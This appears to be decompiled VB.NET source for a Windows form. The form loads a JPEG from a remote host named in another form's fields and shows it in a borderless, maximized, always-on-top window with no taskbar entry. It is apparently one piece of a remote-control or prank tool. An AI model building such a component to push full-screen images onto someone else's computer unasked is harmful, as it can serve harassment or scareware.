Imports Microsoft.VisualBasic.CompilerServices
Imports My
Imports System
Imports System.Collections.Generic
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.Runtime.CompilerServices
Imports System.Windows.Forms

<DesignerGenerated> _
Public Class Form7
    Inherits Form
    ' Methods
    <DebuggerNonUserCode> _
    Public Sub New()
        AddHandler MyBase.Load, New EventHandler(AddressOf Me.Form7_Load)
        Dim list As List(Of WeakReference) = Form7.__ENCList
        SyncLock list
            Form7.__ENCList.Add(New WeakReference(Me))
        End SyncLock
        Me.InitializeComponent
    End Sub

    <DebuggerNonUserCode> _
    Protected Overrides Sub Dispose(ByVal disposing As Boolean)
        Try 
            If (disposing AndAlso (Not Me.components Is Nothing)) Then
                Me.components.Dispose
            End If
        Finally
            MyBase.Dispose(disposing)
        End Try
    End Sub

    Private Sub Form7_Load(ByVal sender As Object, ByVal e As EventArgs)
        Me.PictureBox1.SizeMode = PictureBoxSizeMode.Zoom
        Me.PictureBox1.Load((MyProject.Forms.Form1.hostlink.ToString & "/IMG/" & MyProject.Forms.Form1.imagenmr.ToString & ".jpg"))
    End Sub

    <DebuggerStepThrough> _
    Private Sub InitializeComponent()
        Me.PictureBox1 = New PictureBox
        DirectCast(Me.PictureBox1, ISupportInitialize).BeginInit
        Me.SuspendLayout
        Me.PictureBox1.Dock = DockStyle.Fill
        Dim point As New Point(0, 0)
        Me.PictureBox1.Location = point
        Me.PictureBox1.Name = "PictureBox1"
        Dim size As New Size(&H313, &H192)
        Me.PictureBox1.Size = size
        Me.PictureBox1.TabIndex = 0
        Me.PictureBox1.TabStop = False
        Dim ef As New SizeF(6!, 13!)
        Me.AutoScaleDimensions = ef
        Me.AutoScaleMode = AutoScaleMode.Font
        Me.BackColor = Color.Black
        size = New Size(&H313, &H192)
        Me.ClientSize = size
        Me.Controls.Add(Me.PictureBox1)
        Me.FormBorderStyle = FormBorderStyle.None
        Me.MaximizeBox = False
        Me.MinimizeBox = False
        Me.Name = "Form7"
        Me.ShowIcon = False
        Me.ShowInTaskbar = False
        Me.TopMost = True
        Me.WindowState = FormWindowState.Maximized
        DirectCast(Me.PictureBox1, ISupportInitialize).EndInit
        Me.ResumeLayout(False)
    End Sub

    Private Sub PictureBox1_Click(ByVal sender As Object, ByVal e As EventArgs)
    End Sub


    ' Properties
    Friend Overridable Property PictureBox1 As PictureBox
        <DebuggerNonUserCode> _
        Get
            Return Me._PictureBox1
        End Get
        <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
        Set(ByVal WithEventsValue As PictureBox)
            Dim handler As EventHandler = New EventHandler(AddressOf Me.PictureBox1_Click)
            If (Not Me._PictureBox1 Is Nothing) Then
                RemoveHandler Me._PictureBox1.Click, handler
            End If
            Me._PictureBox1 = WithEventsValue
            If (Not Me._PictureBox1 Is Nothing) Then
                AddHandler Me._PictureBox1.Click, handler
            End If
        End Set
    End Property


    ' Fields
    Private Shared __ENCList As List(Of WeakReference) = New List(Of WeakReference)
    <AccessedThroughProperty("PictureBox1")> _
    Private _PictureBox1 As PictureBox
    Private components As IContainer
End Class


